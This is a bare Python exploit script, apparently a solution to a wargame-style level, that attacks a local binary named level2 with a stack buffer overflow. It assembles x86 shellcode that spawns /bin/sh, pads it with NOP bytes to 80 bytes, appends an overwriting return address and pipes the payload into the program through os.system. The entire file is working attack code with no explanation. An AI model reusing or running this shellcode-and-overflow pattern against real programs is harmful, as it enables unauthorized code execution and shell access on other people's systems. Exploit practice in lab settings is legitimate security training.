#!/usr/bin/python

import os

returnAddr = "\x08\x04\xa0\x08"[::-1]
shellcode = "\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"
nop = "\x90"
payload = shellcode + (80 - len(shellcode))*nop + returnAddr
cmd = "echo \"" + payload + "\" - | /home/user/level2/level2"
os.system(cmd)
